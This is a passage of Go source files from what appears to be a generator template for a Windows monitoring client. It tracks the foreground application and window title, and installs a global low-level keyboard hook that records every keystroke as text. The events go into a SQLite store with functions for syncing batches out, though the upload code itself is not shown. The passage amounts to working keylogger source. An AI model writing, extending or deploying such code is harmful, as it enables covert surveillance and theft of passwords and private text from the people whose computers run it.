	r0, _, e1 := syscall.SyscallN(procGetWindowTextWFg.Addr(), hwnd, uintptr(unsafe.Pointer(&buffer[0])), uintptr(len(buffer)))
	if r0 == 0 {
		// If e1 is a real error, return it. Otherwise, it might just be an empty title.
		if e1 != 0 && e1.Error() != "The operation completed successfully." {
			return "", e1
		}
		// Fall through to return empty string if r0 is 0 (empty title or minor error)
	}
	return windows.UTF16ToString(buffer[:r0]), nil
}

func GetWindowThreadProcessIdInternal(hwnd uintptr) (threadId uint32, processId uint32, err error) {
	var pid uint32
	r0, _, e1 := syscall.SyscallN(procGetWindowThreadProcessIdFg.Addr(), hwnd, uintptr(unsafe.Pointer(&pid)))
	if r0 == 0 { // If GetWindowThreadProcessId fails, it returns 0 for threadId.
		if e1 != 0 && e1.Error() != "The operation completed successfully." {
			return 0, 0, e1
		}
		// This is a more definite failure if hwnd was supposed to be valid
		return 0, 0, fmt.Errorf("GetWindowThreadProcessIdInternal API call failed for HWND %X (threadId was 0)", hwnd)
	}
	return uint32(r0), pid, nil
}

func getProcessImagePathInternal(pid uint32, logger *log.Logger) (string, error) {
	// Try with limited information first, it's generally safer/requires fewer privileges.
	handle, err := windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
	if err != nil {
		// Fallback to PROCESS_QUERY_INFORMATION if limited fails
		handle, err = windows.OpenProcess(PROCESS_QUERY_INFORMATION, false, pid)
		if err != nil {
			return "", fmt.Errorf("OpenProcess failed for PID %d (tried limited and query_information): %w", pid, err)
		}
	}
	defer windows.CloseHandle(handle)

	var buffer [MAX_PATH]uint16 // Use the defined MAX_PATH constant
	var size uint32 = MAX_PATH  // Size is in characters

	err = windows.QueryFullProcessImageName(handle, 0, &buffer[0], &size)
	if err != nil {
		if logger != nil {
			logger.Printf("VERBOSE: QueryFullProcessImageNameW failed for PID %d: %v. This can happen for some system processes or due to permissions.", pid, err)
		}
		return "", fmt.Errorf("QueryFullProcessImageNameW failed for PID %d: %w", pid, err)
	}
	// size will be updated by QueryFullProcessImageName to the actual length
	return windows.UTF16ToString(buffer[:size]), nil
}

func GetCurrentForegroundAppInfo(logger *log.Logger) (ForegroundAppInfo, error) {
	var info ForegroundAppInfo

	hwnd, err := GetForegroundWindowInternal()
	if err != nil {
		// This would be an error in the SyscallN itself, quite rare.
		return info, fmt.Errorf("getForegroundWindowInternal syscall error: %w", err)
	}
	if hwnd == 0 {
		// No window is in the foreground. This is a valid state.
		// Return empty info, not an error that stops polling.
		return info, nil
	}
	info.HWND = hwnd

	title, errText := GetWindowTextInternal(hwnd)
	// errText from GetWindowTextInternal is often not critical if title is just empty.
	if errText != nil && logger != nil { // Log only if there's a notable error.
		logger.Printf("Warning: GetWindowTextInternal for HWND %X returned error: %v (Title: '%s')", hwnd, errText, title)
	}
	info.Title = title

	threadID, pid, errPid := GetWindowThreadProcessIdInternal(hwnd)
	if errPid != nil {
		// If we had a valid HWND, failing to get PID is more problematic.
		if logger != nil {
			logger.Printf("Error: GetWindowThreadProcessIdInternal for HWND %X: %v", hwnd, errPid)
		}
		// We can still return the HWND and Title info obtained so far.
		// Or decide this is a hard error for this function's contract.
		// For now, let's return what we have and the error.
		return info, fmt.Errorf("getWindowThreadProcessIdInternal for HWND %X: %w", hwnd, errPid)
	}
	info.ThreadID = threadID
	info.PID = pid

	if pid != 0 {
		imagePath, errPath := getProcessImagePathInternal(pid, logger)
		if errPath != nil {
			// Error potentially logged by getProcessImagePathInternal
			if logger != nil && !strings.Contains(errPath.Error(), "QueryFullProcessImageNameW failed") {
				// Avoid double logging if getProcessImagePathInternal already logged QueryFull...
				logger.Printf("Warning: getProcessImagePathInternal for PID %d failed: %v", pid, errPath)
			}
			info.ProcessName = "unknown.exe"
			info.ExecutablePath = "[Error getting path]"
		} else {
			info.ExecutablePath = imagePath
			info.ProcessName = filepath.Base(imagePath)
		}
	} else {
		info.ProcessName = "System" // Or some other placeholder if PID is 0
		info.ExecutablePath = "[N/A]"
	}

	return info, nil
}

type ActiveAppEvent struct {
	Timestamp time.Time
	Info      ForegroundAppInfo
	IsSwitch  bool
}

func monitorForegroundApp(appEventChan chan<- ActiveAppEvent, pollInterval time.Duration, quit <-chan struct{}, logger *log.Logger) {
	if logger != nil {
		logger.Println("Foreground app monitor started.")
	} else {
		log.Println("FG_MON: Foreground app monitor started (global logger fallback - not ideal).")
	}

	var lastAppInfo ForegroundAppInfo
	var firstRun = true

	ticker := time.NewTicker(pollInterval)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			currentAppInfo, err := GetCurrentForegroundAppInfo(logger)
			if err != nil {
				if logger != nil {
					// Reduce log spam for common errors like "no foreground window"
					// or specific errors from GetWindowThreadProcessIdInternal if HWND was bad.
					// Log other unexpected errors more verbosely.
					if !strings.Contains(err.Error(), "GetWindowThreadProcessIdInternal API call failed") {
						logger.Printf("Error in GetCurrentForegroundAppInfo poll: %v", err)
					}
				}
				// Even on error, reset lastAppInfo if the error implies current app is unknown
				// This helps trigger a "switch" if a valid app appears next.
				if lastAppInfo.PID != 0 { // If we were tracking an app
					lastAppInfo = ForegroundAppInfo{} // Reset
				}
				continue
			}

			// If currentAppInfo.HWND is 0, GetCurrentForegroundAppInfo now returns empty struct and nil error
			if currentAppInfo.HWND == 0 {
				if lastAppInfo.PID != 0 { // If we were previously tracking an app
					if logger != nil {
						logger.Printf("App focus lost or switched to desktop (HWND is 0). Last tracked: %s", lastAppInfo.ProcessName)
					}
					// Send an event indicating focus lost? Or just reset lastAppInfo.
					// For now, just reset. The next valid app will be a "switch".
					lastAppInfo = ForegroundAppInfo{}
					// Optionally send an event for "focus lost" if needed by event aggregator
					// Example:
					// appEventChan <- ActiveAppEvent{
					// 	Timestamp: time.Now().UTC(),
					// 	Info:      ForegroundAppInfo{ProcessName: "Desktop/NoFocus"}, // Special info
					// 	IsSwitch:  true,
					// }
				}
				firstRun = false // No app, but polling cycle happened
				continue
			}

			isSwitch := false
			// A "significant switch" happens if PID changes, or ProcessName changes,
			// or (if app is the same) the Title changes meaningfully.
			if firstRun ||
				currentAppInfo.PID != lastAppInfo.PID ||
				currentAppInfo.ProcessName != lastAppInfo.ProcessName || // Covers case where PID might be recycled quickly
				(currentAppInfo.PID == lastAppInfo.PID && currentAppInfo.Title != lastAppInfo.Title) { // Title change for same app

				// Additional check: ignore switches if new ProcessName is empty but PID is not (shouldn't happen with current logic)
				// or if it's just a switch between two "unknown.exe" if path retrieval failed for both.
				if currentAppInfo.ProcessName == "" && currentAppInfo.PID != 0 {
					if logger != nil {
						logger.Printf("VERBOSE: Ignoring potential switch to app with PID %d but no process name.", currentAppInfo.PID)
					}
				} else {
					isSwitch = true
					if logger != nil {
						logger.Printf("App Switch/Update: PID=%d, Name=%s, Path=\"%s\", Title=\"%s\"",
							currentAppInfo.PID, currentAppInfo.ProcessName, currentAppInfo.ExecutablePath, currentAppInfo.Title)
					}

					appEventChan <- ActiveAppEvent{
						Timestamp: time.Now().UTC(),
						Info:      currentAppInfo,
						IsSwitch:  isSwitch, // This event always represents a "new context"
					}
					lastAppInfo = currentAppInfo
				}
			}
			firstRun = false

		case <-quit:
			if logger != nil {
				logger.Println("Foreground app monitor stopping.")
			}
			return
		}
	}
}

'''
'''--- generator/templates/client_template/keyboard_processing.go ---
// GuiKeyStandaloneGo/generator/templates/client_template/keyboard_processing.go
package main

import (
	"fmt"
	"log" // For logger parameter type
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Windows API for key processing
// Ensure lazyModUser32 is accessible if these procs are used.
// If keyboard_windows.go and this file are separate and both need these,
// they should either share a global lazyModUser32 (defined in one place, e.g., main.go or a winapi_utils.go)
// or each initialize their own. For now, assuming it's available from where this is called,
// or that these specific procs will be initialized similarly to how they are in keyboard_windows.go if needed.
// For ToUnicode, we will use the one from keyboard_windows.go (lazyModUser32).
var (
	procGetKeyboardStateKeyProc = lazyModUser32.NewProc("GetKeyboardState") // Assuming lazyModUser32 is the one from keyboard_windows.go or similar
	procToUnicodeKeyProc        = lazyModUser32.NewProc("ToUnicode")
	// procMapVirtualKeyW // Not currently used, but can be added if needed
)

type ProcessedKeyEvent struct {
	OriginalRaw RawKeyData // Keep original for full context if needed
	KeyValue    string     // The character or key name (e.g., "A", "[ENTER]", "[CTRL]")
	IsChar      bool       // True if KeyValue is a printable character
	IsKeyDown   bool
	Timestamp   time.Time // Added timestamp from RawKeyData
}

// vkCodeToString attempts to convert a virtual key code to a string.
// It uses ToUnicode for characters and a map for special keys.
// This should be called from a regular Go goroutine, NOT from the hook procedure.
func vkCodeToString(vkCode uint32, scanCode uint32, flags uint32, isKeyDown bool, logger *log.Logger) (keyVal string, isChar bool) {
	var kbState [256]byte
	var charBuf [4]uint16

	ret, _, errState := syscall.SyscallN(procGetKeyboardStateKeyProc.Addr(), uintptr(unsafe.Pointer(&kbState[0])))
	if ret == 0 {
		if logger != nil {
			logger.Printf("VKPROC: GetKeyboardState failed: %v", errState)
		}
		return simpleVKMap(vkCode, logger), false // Pass logger
	}

	nChars, _, errUnicode := syscall.SyscallN(procToUnicodeKeyProc.Addr(),
		uintptr(vkCode),
		uintptr(scanCode),
		uintptr(unsafe.Pointer(&kbState[0])),
		uintptr(unsafe.Pointer(&charBuf[0])),
		uintptr(len(charBuf)),
		0,
	)

	// syscall.Errno 0 means success for the syscall itself.
	// The return value nChars indicates translation status.
	if errUnicode != 0 && logger != nil { // Log if syscall.Errno is non-zero
		logger.Printf("VKPROC: ToUnicode syscall returned errno: %v", errUnicode)
	}

	if nChars > 0 {
		return windows.UTF16ToString(charBuf[:nChars]), true
	} else if int(nChars) == -1 {
		// Dead key, often better to ignore for typed text or handle specially.
		// For now, map it as a special key.
		if logger != nil {
			logger.Printf("VKPROC: Detected dead key for VK=0x%X", vkCode)
		}
		return simpleVKMap(vkCode, logger), false // Pass logger
	} else { // nChars == 0, no translation
		return simpleVKMap(vkCode, logger), false // Pass logger
	}
}

// simpleVKMap provides a basic mapping for non-character keys.
func simpleVKMap(vkCode uint32, logger *log.Logger) string { // Accept logger (though not used much here yet)
	switch vkCode {
	case windows.VK_BACK:
		return "[BACKSPACE]"
	case windows.VK_TAB:
		return "[TAB]"
	case windows.VK_RETURN:
		return "[ENTER]"
	case windows.VK_SHIFT, windows.VK_LSHIFT, windows.VK_RSHIFT:
		return "[SHIFT]"
	case windows.VK_CONTROL, windows.VK_LCONTROL, windows.VK_RCONTROL:
		return "[CTRL]"
	case windows.VK_MENU, windows.VK_LMENU, windows.VK_RMENU:
		return "[ALT]" // ALT
	case windows.VK_PAUSE:
		return "[PAUSE]"
	case windows.VK_CAPITAL:
		return "[CAPSLOCK]"
	case windows.VK_ESCAPE:
		return "[ESC]"
	case windows.VK_SPACE:
		return " " // ToUnicode should handle this, but good fallback
	case windows.VK_PRIOR:
		return "[PAGEUP]"
	case windows.VK_NEXT:
		return "[PAGEDOWN]"
	case windows.VK_END:
		return "[END]"
	case windows.VK_HOME:
		return "[HOME]"
	case windows.VK_LEFT:
		return "[LEFT]"
	case windows.VK_UP:
		return "[UP]"
	case windows.VK_RIGHT:
		return "[RIGHT]"
	case windows.VK_DOWN:
		return "[DOWN]"
	case windows.VK_INSERT:
		return "[INSERT]"
	case windows.VK_DELETE:
		return "[DELETE]"
	case windows.VK_LWIN, windows.VK_RWIN:
		return "[WIN]"
	case windows.VK_APPS:
		return "[APPS]"
	case windows.VK_SNAPSHOT:
		return "[PRINTSCREEN]"
	case windows.VK_NUMLOCK:
		return "[NUMLOCK]"
	case windows.VK_SCROLL:
		return "[SCROLLLOCK]"
	case windows.VK_F1:
		return "[F1]"
	case windows.VK_F2:
		return "[F2]"
	case windows.VK_F3:
		return "[F3]"
	case windows.VK_F4:
		return "[F4]"
	case windows.VK_F5:
		return "[F5]"
	case windows.VK_F6:
		return "[F6]"
	case windows.VK_F7:
		return "[F7]"
	case windows.VK_F8:
		return "[F8]"
	case windows.VK_F9:
		return "[F9]"
	case windows.VK_F10:
		return "[F10]"
	case windows.VK_F11:
		return "[F11]"
	case windows.VK_F12:
		return "[F12]"
	case windows.VK_OEM_1:
		return ";" // Often ;:
	case windows.VK_OEM_PLUS:
		return "="
	case windows.VK_OEM_COMMA:
		return ","
	case windows.VK_OEM_MINUS:
		return "-"
	case windows.VK_OEM_PERIOD:
		return "."
	case windows.VK_OEM_2:
		return "/" // Often /?
	case windows.VK_OEM_3:
		return "`" // Often `~
	case windows.VK_OEM_4:
		return "[" // Often [{
	case windows.VK_OEM_5:
		return "\\" // Often \|
	case windows.VK_OEM_6:
		return "]" // Often ]}
	case windows.VK_OEM_7:
		return "'" // Often '"
	// Numpad characters are usually handled by ToUnicode if NumLock is on
	case windows.VK_NUMPAD0:
		return "[NUM0]"
	case windows.VK_NUMPAD1:
		return "[NUM1]"
	case windows.VK_NUMPAD2:
		return "[NUM2]"
	case windows.VK_NUMPAD3:
		return "[NUM3]"
	case windows.VK_NUMPAD4:
		return "[NUM4]"
	case windows.VK_NUMPAD5:
		return "[NUM5]"
	case windows.VK_NUMPAD6:
		return "[NUM6]"
	case windows.VK_NUMPAD7:
		return "[NUM7]"
	case windows.VK_NUMPAD8:
		return "[NUM8]"
	case windows.VK_NUMPAD9:
		return "[NUM9]"
	case windows.VK_MULTIPLY:
		return "[NUM*]"
	case windows.VK_ADD:
		return "[NUM+]"
	case windows.VK_SUBTRACT:
		return "[NUM-]"
	case windows.VK_DECIMAL:
		return "[NUM.]"
	case windows.VK_DIVIDE:
		return "[NUM/]"
	default:
		if logger != nil {
			// logger.Printf("VKPROC: Unmapped VK Code: 0x%X", vkCode) // Can be noisy
		}
		return fmt.Sprintf("[VK_0x%X]", vkCode)
	}
}

// This function will be run in a goroutine to process raw key data
func processRawKeyEvents(rawKeyIn <-chan RawKeyData, processedKeyOut chan<- ProcessedKeyEvent, quit <-chan struct{}, logger *log.Logger) {
	if logger != nil {
		logger.Println("Key event processing goroutine started.")
	}

	for {
		select {
		case rawEvent, ok := <-rawKeyIn:
			if !ok {
				if logger != nil {
					logger.Println("Raw key input channel closed. Key processor stopping.")
				}
				return
			}

			keyValue, isChar := vkCodeToString(rawEvent.VkCode, rawEvent.ScanCode, rawEvent.Flags, rawEvent.IsKeyDown, logger) // Pass logger

			processedKeyOut <- ProcessedKeyEvent{
				OriginalRaw: rawEvent,
				KeyValue:    keyValue,
				IsChar:      isChar,
				IsKeyDown:   rawEvent.IsKeyDown,
				Timestamp:   rawEvent.Timestamp, // Carry over the timestamp
			}

		case <-quit:
			if logger != nil {
				logger.Println("Key event processing goroutine stopping.")
			}
			return
		}
	}
}

'''
'''--- generator/templates/client_template/keyboard_windows.go ---
// GuiKeyStandaloneGo/generator/templates/client_template/keyboard_windows.go
package main

import (
	"fmt"
	"log"     // For logger parameter type
	"runtime" // For LockOSThread
	"sync"    // For WaitGroup
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// --- Windows API constants and structs for Keyboard Hook ---
const (
	WH_KEYBOARD_LL = 13
	WM_KEYDOWN     = 0x0100
	WM_KEYUP       = 0x0101
	WM_SYSKEYDOWN  = 0x0104
	WM_SYSKEYUP    = 0x0105
	HC_ACTION      = 0
	LLKHF_UP       = 0x0080
)

type KBDLLHOOKSTRUCT struct {
	VkCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DwExtraInfo uintptr
}

// Use distinct names for these LazyDLL instances if foreground_windows.go also defines them,
// or ensure they are defined once globally (e.g., in a winapi_utils.go or main.go) and used by all.
// For this file's context, assuming these are the ones it will use:
var (
	lazyModUser32           = windows.NewLazySystemDLL("user32.dll")
	lazyModKernel32         = windows.NewLazySystemDLL("kernel32.dll")
	procSetWindowsHookExW   = lazyModUser32.NewProc("SetWindowsHookExW")
	procUnhookWindowsHookEx = lazyModUser32.NewProc("UnhookWindowsHookEx")
	procCallNextHookEx      = lazyModUser32.NewProc("CallNextHookEx")
	procGetMessageW         = lazyModUser32.NewProc("GetMessageW")
	procTranslateMessage    = lazyModUser32.NewProc("TranslateMessage")
	procDispatchMessageW    = lazyModUser32.NewProc("DispatchMessageW")
	procGetModuleHandleW    = lazyModKernel32.NewProc("GetModuleHandleW")
	// procPostThreadMessageW  = lazyModUser32.NewProc("PostThreadMessageW") // For cleaner shutdown later
)

type MSG struct {
	Hwnd    uintptr
	Message uint32
	WParam  uintptr
	LParam  uintptr
	Time    uint32
	Pt      struct{ X, Y int32 }
}

type RawKeyData struct {
	VkCode    uint32
	ScanCode  uint32
	Flags     uint32
	IsKeyDown bool
	Timestamp time.Time
}

var (
	keyboardHookHandle uintptr // HHOOK
	keyDataChanGlobal  chan<- RawKeyData
	// loggerForHook    *log.Logger // Avoid using global logger directly in hook proc
)

func lowLevelKeyboardProc(nCode int, wParam uintptr, lParam uintptr) uintptr {
	if nCode == HC_ACTION {
		kbdStruct := (*KBDLLHOOKSTRUCT)(unsafe.Pointer(lParam))
		isDown := !(wParam == WM_KEYUP || wParam == WM_SYSKEYUP || (kbdStruct.Flags&LLKHF_UP != 0))

		if keyDataChanGlobal != nil {
			// Non-blocking send attempt
			select {
			case keyDataChanGlobal <- RawKeyData{
				VkCode:    kbdStruct.VkCode,
				ScanCode:  kbdStruct.ScanCode,
				Flags:     kbdStruct.Flags,
				IsKeyDown: isDown,
				Timestamp: time.Now().UTC(),
			}:
			default:
				// Dropping key event: channel full or closed.
				// Cannot safely log from here without potential deadlocks or performance issues.
				// This should be monitored by checking channel length/capacity elsewhere if issues arise.
			}
		}
	}
	// IMPORTANT: Always call CallNextHookEx and return its result.
	nextHook, _, _ := syscall.SyscallN(procCallNextHookEx.Addr(), keyboardHookHandle, uintptr(nCode), wParam, lParam)
	return nextHook
}

func runKeyboardHookMessageLoop(keyDataChan chan<- RawKeyData, hookQuitChan <-chan struct{}, logger *log.Logger) {
	keyDataChanGlobal = keyDataChan // Set global for the C callback

	hModule, _, errGetModuleHandle := syscall.SyscallN(procGetModuleHandleW.Addr(), 0)
	if hModule == 0 {
		errMsg := "KBHOOK: GetModuleHandleW(NULL) failed"
		if errGetModuleHandle != 0 {
			errMsg = fmt.Sprintf("%s: %s", errMsg, errGetModuleHandle.Error())
		}
		if logger != nil {
			logger.Println(errMsg)
		} else {
			log.Println(errMsg) // Fallback
		}
		return
	}

	// syscall.NewCallback must be assigned to a variable that lives for the duration of the hook
	// to prevent GC from collecting the callback trampoline.
	keyboardProcCallbackFn := syscall.NewCallback(lowLevelKeyboardProc)

	hHook, _, errSetHook := syscall.SyscallN(procSetWindowsHookExW.Addr(),
		uintptr(WH_KEYBOARD_LL),
		keyboardProcCallbackFn, // Use the stored callback
		hModule,
		0) // dwThreadId = 0 for global hook

	if hHook == 0 {
		errMsg := "KBHOOK: SetWindowsHookExW failed"
		if errSetHook != 0 {
			errMsg = fmt.Sprintf("%s: %s", errMsg, errSetHook.Error())
		}
		if logger != nil {
			logger.Println(errMsg)
		} else {
			log.Println(errMsg) // Fallback
		}
		return
	}
	keyboardHookHandle = hHook // Store hook handle globally
	if logger != nil {
		logger.Println("KBHOOK: Keyboard hook set successfully.")
	}

	defer func() {
		if keyboardHookHandle != 0 { // Only unhook if successfully hooked
			r1, _, errUnhook := syscall.SyscallN(procUnhookWindowsHookEx.Addr(), keyboardHookHandle)
			if r1 == 0 { // Failure
				errMsg := "KBHOOK: UnhookWindowsHookEx failed"
				if errUnhook != 0 {
					errMsg = fmt.Sprintf("%s: %s", errMsg, errUnhook.Error())
				}
				if logger != nil {
					logger.Println(errMsg)
				}
			} else {
				if logger != nil {
					logger.Println("KBHOOK: Keyboard hook successfully unhooked.")
				}
			}
			keyboardHookHandle = 0 // Clear global handle
		}
		keyDataChanGlobal = nil // Clear global channel ref
	}()

	var msg MSG
	for {
		// Check quit channel before blocking on GetMessage.
		// This makes shutdown more responsive.
		select {
		case <-hookQuitChan:
			if logger != nil {
				logger.Println("KBHOOK: Message loop received quit signal (pre-GetMessage).")
			}
			return
		default:
			// Proceed to GetMessage
		}

		// GetMessageW will block.
		// For a more robust shutdown, PostThreadMessageW(threadId, WM_QUIT, 0, 0)
		// should be called from the goroutine that closes hookQuitChan.
		// The current select default is a quick check, won't help if GetMessageW is deep blocking.
		ret, _, errGetMsg := syscall.SyscallN(procGetMessageW.Addr(), uintptr(unsafe.Pointer(&msg)), 0, 0, 0)

		// Check quit channel again immediately after GetMessageW returns
		select {
		case <-hookQuitChan:
			if logger != nil {
				logger.Println("KBHOOK: Message loop received quit signal (post-GetMessage).")
			}
			return
		default:
		}

		if int(ret) == -1 { // Error
			errMsg := "KBHOOK: GetMessageW error"
			if errGetMsg != 0 {
				errMsg = fmt.Sprintf("%s: %s", errMsg, errGetMsg.Error())
			}
			if logger != nil {
				logger.Println(errMsg)
			}
			return
		}
		if int(ret) == 0 { // WM_QUIT
			if logger != nil {
				logger.Println("KBHOOK: GetMessageW received WM_QUIT.")
			}
			return
		}

		syscall.SyscallN(procTranslateMessage.Addr(), uintptr(unsafe.Pointer(&msg)))
		syscall.SyscallN(procDispatchMessageW.Addr(), uintptr(unsafe.Pointer(&msg)))
	}
}

func startKeyboardMonitor(keyDataChan chan<- RawKeyData, internalQuitChan <-chan struct{}, wg *sync.WaitGroup, logger *log.Logger) {
	if logger != nil {
		logger.Println("KBHOOK: Initializing keyboard monitor...")
	}

	hookThreadQuitChan := make(chan struct{})

	wg.Add(1) // For the managing goroutine
	go func() {
		defer wg.Done()

		monitorLoopDone := make(chan struct{}) // To signal completion of the OS-locked goroutine

		// This inner goroutine will be locked to an OS thread.
		go func() {
			runtime.LockOSThread() // Lock this goroutine to an OS thread
			defer runtime.UnlockOSThread()
			defer close(monitorLoopDone) // Signal that this OS-locked goroutine has finished

			if logger != nil {
				logger.Println("KBHOOK: OS-locked thread for hook message loop starting.")
			}
			runKeyboardHookMessageLoop(keyDataChan, hookThreadQuitChan, logger) // Pass logger
			if logger != nil {
				logger.Println("KBHOOK: OS-locked thread (runKeyboardHookMessageLoop) finished.")
			}
		}()

		// This select block manages the lifecycle of the hook loop goroutine.
		// It waits for either the main internalQuitChan or for the hook loop to finish on its own.
		select {
		case <-internalQuitChan: // Main program is quitting
			if logger != nil {
				logger.Println("KBHOOK: Managing goroutine received internal quit signal, signaling hook thread to stop.")
			}
			close(hookThreadQuitChan) // Signal the OS-locked goroutine (hook's message loop) to stop
			<-monitorLoopDone         // Wait for the OS-locked goroutine to actually finish (which includes unhooking)
		case <-monitorLoopDone: // Hook loop finished on its own (e.g., an error in runKeyboardHookMessageLoop)
			if logger != nil {
				logger.Println("KBHOOK: OS-locked hook message loop exited independently.")
			}
			// If it exited on its own, the main program might still be running or also shutting down.
			// No need to close hookThreadQuitChan again if it's already done.
		}

		if logger != nil {
			logger.Println("KBHOOK: Keyboard monitor managing goroutine finished.")
		}
	}()
}

'''
'''--- generator/templates/client_template/log_store_sqlite.go ---
// GuiKeyStandaloneGo/generator/templates/client_template/log_store_sqlite.go
package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"guikeystandalonego/pkg/types"

	"github.com/google/uuid"
	_ "github.com/mattn/go-sqlite3"
)

const (
	dbDriverName        = "sqlite3"
	dbPragmaWAL         = "PRAGMA journal_mode=WAL;"
	dbPragmaBusyTimeout = "PRAGMA busy_timeout = 5000;"
	dbPragmaSynchronous = "PRAGMA synchronous = NORMAL;"
	// Constants for aggressive pruning
	aggressivePruneBatchSize = 100 // How many oldest events to delete at a time during aggressive prune
	dbSizeReductionTarget    = 0.8 // Target to reduce DB size to (e.g., 80% of max) during aggressive prune
)

type LogStore struct {
	db     *sql.DB
	logger *log.Logger
	dbPath string
}

// NewLogStore, initSchema, AddLogEvent, GetBatchForSync, ConfirmEventsSynced, PruneOldLogs (regular retention)
// remain the same as the last fully correct version. I'll include them for completeness.

func NewLogStore(dbFilePath string, logger *log.Logger) (*LogStore, error) {
	if logger == nil {
		logger = log.New(os.Stdout, "LOGSTORE_FALLBACK: ", log.LstdFlags|log.Lshortfile)
		logger.Println("Warning: LogStore initialized with fallback logger.")
	}
	dbDir := filepath.Dir(dbFilePath)
	if err := os.MkdirAll(dbDir, 0755); err != nil {
		return nil, fmt.Errorf("logstore: failed to create database directory %s: %w", dbDir, err)
	}
	dsn := fmt.Sprintf("file:%s?cache=shared&mode=rwc&_journal_mode=WAL&_busy_timeout=5000", dbFilePath)
	db, err := sql.Open(dbDriverName, dsn)
	if err != nil {
		return nil, fmt.Errorf("logstore: failed to open SQLite database at %s: %w", dbFilePath, err)
	}
	pragmas := []string{dbPragmaSynchronous} // WAL and busy_timeout are in DSN now
	for _, pragma := range pragmas {
		if _, errP := db.Exec(pragma); errP != nil {
			logger.Printf("LogStore: Warning - Failed to set pragma '%s': %v", pragma, errP)
		}
	}
	store := &LogStore{db: db, logger: logger, dbPath: dbFilePath}
	if err := store.initSchema(); err != nil {
		db.Close()
		return nil, fmt.Errorf("logstore: failed to initialize schema: %w", err)
	}
	logger.Printf("LogStore: SQLite initialized. DB: %s", dbFilePath)
	return store, nil
}

func (s *LogStore) initSchema() error {
	createTableSQL := `
	CREATE TABLE IF NOT EXISTS log_events (
		id TEXT PRIMARY KEY, client_id TEXT NOT NULL, event_timestamp INTEGER NOT NULL, 
		application_name TEXT, schema_version INTEGER, event_data_json TEXT NOT NULL 
	);
	CREATE INDEX IF NOT EXISTS idx_log_events_event_timestamp ON log_events (event_timestamp);`
	_, err := s.db.Exec(createTableSQL)
	if err != nil {
		return fmt.Errorf("logstore: failed to create log_events table: %w", err)
	}
	s.logger.Println("LogStore: SQLite schema initialized/verified.")
	return nil
}

func (s *LogStore) AddLogEvent(event types.LogEvent) error {
	jsonData, err := json.Marshal(event)
	if err != nil {
		return fmt.Errorf("logstore: failed to marshal LogEvent (ID: %s): %w", event.ID, err)
	}
	_, err = s.db.Exec(
		"INSERT INTO log_events (id, client_id, event_timestamp, application_name, schema_version, event_data_json) VALUES (?, ?, ?, ?, ?, ?)",
		event.ID.String(), event.ClientID.String(), event.Timestamp.Unix(),
		event.ApplicationName, event.SchemaVersion, string(jsonData),
	)
	if err != nil {
		if strings.Contains(err.Error(), "UNIQUE constraint failed") {
			s.logger.Printf("LogStore: Warning - LogEvent with ID %s already exists. Skipping insert.", event.ID)
			return nil
		}
		return fmt.Errorf("logstore: failed to insert LogEvent (ID: %s): %w", event.ID, err)
	}
	return nil
}

func (s *LogStore) GetBatchForSync(limit int) ([]types.LogEvent, error) {
	if limit <= 0 {
		return []types.LogEvent{}, nil
	}
	rows, err := s.db.Query("SELECT event_data_json FROM log_events ORDER BY event_timestamp ASC LIMIT ?", limit)
	if err != nil {
		return nil, fmt.Errorf("logstore: failed to query batch for sync: %w", err)
	}
	defer rows.Close()
	var events []types.LogEvent
	for rows.Next() {
		var jsonData string
		if errR := rows.Scan(&jsonData); errR != nil {
			s.logger.Printf("LogStore: Error scanning row for sync batch: %v. Skipping.", errR)
			continue
		}
		var event types.LogEvent
		if errU := json.Unmarshal([]byte(jsonData), &event); errU != nil {
			s.logger.Printf("LogStore: Error unmarshaling LogEvent JSON from DB for sync (Data: %.50s...): %v. Skipping.", jsonData, errU)
			continue
		}
		events = append(events, event)
	}
	if errR := rows.Err(); errR != nil {
		return nil, fmt.Errorf("logstore: error iterating sync batch rows: %w", errR)
	}
	// if len(events) > 0 { s.logger.Printf("LogStore: Retrieved %d events for sync batch.", len(events)) } // Can be noisy
	return events, nil
}

func (s *LogStore) ConfirmEventsSynced(eventIDs []uuid.UUID) error {
	if len(eventIDs) == 0 {
		return nil
	}
	tx, err := s.db.Begin()
	if err != nil {
		return fmt.Errorf("logstore: failed to begin tx for confirm sync: %w", err)
	}
	stmt, err := tx.Prepare("DELETE FROM log_events WHERE id = ?")
	if err != nil {
		tx.Rollback()
		return fmt.Errorf("logstore: failed to prepare delete for confirm sync: %w", err)
	}
	defer stmt.Close()
	deletedCount, failedDeletes := 0, 0
	for _, id := range eventIDs {
		res, execErr := stmt.Exec(id.String())
		if execErr != nil {
			s.logger.Printf("LogStore: Error deleting event ID %s during sync: %v", id, execErr)
			failedDeletes++
			break /* Stop on first error for atomicity */
		}
		affected, _ := res.RowsAffected()
		if affected > 0 {
			deletedCount++
		}
	}
	if failedDeletes > 0 {
		tx.Rollback()
		return fmt.Errorf("logstore: %d delete operations failed in confirm sync; transaction rolled back", failedDeletes)
	}
	if err = tx.Commit(); err != nil {
		return fmt.Errorf("logstore: failed to commit confirm sync (deleted %d): %w", deletedCount, err)
	}
	s.logger.Printf("LogStore: Confirmed %d events synced (deleted). Batch size: %d", deletedCount, len(eventIDs))
	return nil
}

// PruneOldLogs (Regular Retention-Based Pruning)
func (s *LogStore) PruneOldLogs(retentionDays uint32) (int64, error) {
	if retentionDays == 0 {
		s.logger.Println("LogStore: Regular log pruning disabled (retention_days = 0).")
		return 0, nil
	}
	cutoffTime := time.Now().Add(-time.Duration(retentionDays) * 24 * time.Hour)
	cutoffTimestampUnix := cutoffTime.Unix()
	s.logger.Printf("LogStore: Regular pruning logs older than %d days (event_timestamp before %s / %d).",
		retentionDays, cutoffTime.Format(time.RFC3339), cutoffTimestampUnix)
	result, err := s.db.Exec("DELETE FROM log_events WHERE event_timestamp < ?", cutoffTimestampUnix)
	if err != nil {
		return 0, fmt.Errorf("logstore: failed to execute regular prune: %w", err)
	}
	rowsAffected, _ := result.RowsAffected()
	if rowsAffected > 0 {
		s.logger.Printf("LogStore: Regular pruning removed %d old entries.", rowsAffected)
	}
	return rowsAffected, nil
}

// --- NEW: Aggressive Pruning for Max DB Size ---
// PruneOldestEventsAggressively deletes the oldest N events to reduce DB size.
